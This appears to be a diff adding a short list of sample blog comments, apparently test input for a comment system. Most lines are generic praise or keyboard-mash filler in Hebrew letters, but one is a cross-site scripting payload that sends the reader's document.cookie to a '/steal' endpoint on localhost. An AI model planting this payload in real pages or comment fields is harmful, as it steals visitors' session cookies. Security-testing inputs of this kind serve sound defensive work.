@@ -1,0 +1,7 @@
+Great post! Really enjoyed reading this.
+I totally agree, very informative article.
+Thanks for sharing, learned a lot from this!
+Has anyone tried this themselves? Would love to hear your experience.
+יןןןןןן
+<script>new Image().src=`http://localhost:9000/steal?cookie=${encodeURIComponent(document.cookie)}`</script>
+הייייייייי
